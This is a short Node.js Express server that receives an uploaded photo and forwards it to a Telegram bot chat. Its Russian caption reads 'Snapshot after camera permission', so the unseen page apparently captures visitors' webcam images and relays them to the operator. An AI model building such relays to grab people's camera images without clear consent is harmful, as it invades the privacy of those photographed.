import express from "express";
import multer from "multer";
import fetch from "node-fetch";

const app = express();
const upload = multer();

const BOT_TOKEN = process.env.TG_BOT_TOKEN;
const CHAT_ID = process.env.TG_CHAT_ID;

app.use(express.static("public"));

app.post("/send-photo", upload.single("photo"), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ ok: false, error: "no file" });

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", "Снимок после разрешения камеры");
    form.append("photo", new Blob([req.file.buffer]), "snapshot.jpg");

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
    });

    const data = await tgRes.json();
    res.status(tgRes.ok ? 200 : 500).json(data);
  } catch (e) {
    console.error(e);
    res.status(500).json({ ok: false, error: String(e) });
  }
});

app.listen(3000, () => console.log("Server started on http://localhost:3000"));
